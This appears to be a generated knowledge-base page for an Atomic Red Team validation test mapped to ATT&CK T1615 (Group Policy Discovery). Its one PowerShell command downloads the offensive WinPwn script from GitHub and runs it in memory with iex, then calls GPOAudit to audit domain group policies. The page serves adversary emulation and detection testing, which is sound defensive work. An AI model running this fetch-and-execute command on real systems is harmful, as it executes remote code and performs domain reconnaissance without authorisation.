---
atomic_guid: "bc25c04b-841e-4965-855f-d1f645d7ab73"
title: "WinPwn - GPOAudit"
framework: "atomic"
generated: "true"
attack_technique_id: "T1615"
attack_technique_name: "Group Policy Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1615/T1615.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "bc25c04b-841e-4965-855f-d1f645d7ab73"
  - "WinPwn - GPOAudit"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - GPOAudit

Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn

## Metadata

- Atomic GUID: bc25c04b-841e-4965-855f-d1f645d7ab73
- Technique: T1615: Group Policy Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1615/T1615.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1615-group_policy_discovery|T1615]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPOAudit -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1615/T1615.yaml)
